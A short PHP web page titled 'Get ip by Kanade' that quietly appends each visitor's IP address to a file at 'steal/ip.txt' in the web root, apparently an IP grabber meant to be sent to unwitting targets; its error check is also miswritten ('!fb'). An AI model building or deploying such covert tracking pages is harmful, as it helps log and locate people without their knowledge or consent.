<html>
<body background="https://www.centriq.com/wp-content/uploads/2018/03/CEH-v10.jpg">
<title>Tachibana Kanade</title>
<center><h3>Get ip by Kanade</h3></center>
<?php
$document=$_SERVER['DOCUMENT_ROOT'];
$fp=fopen("$document/steal/ip.txt","ab");
if(!fb)
{
	exit;
	
}	
$ipaddress = $_SERVER['REMOTE_ADDR'];
$detect="=> ip=$ipaddress\n";
fwrite($fp,$detect);
fclose($fp);
?>
</body>
</html>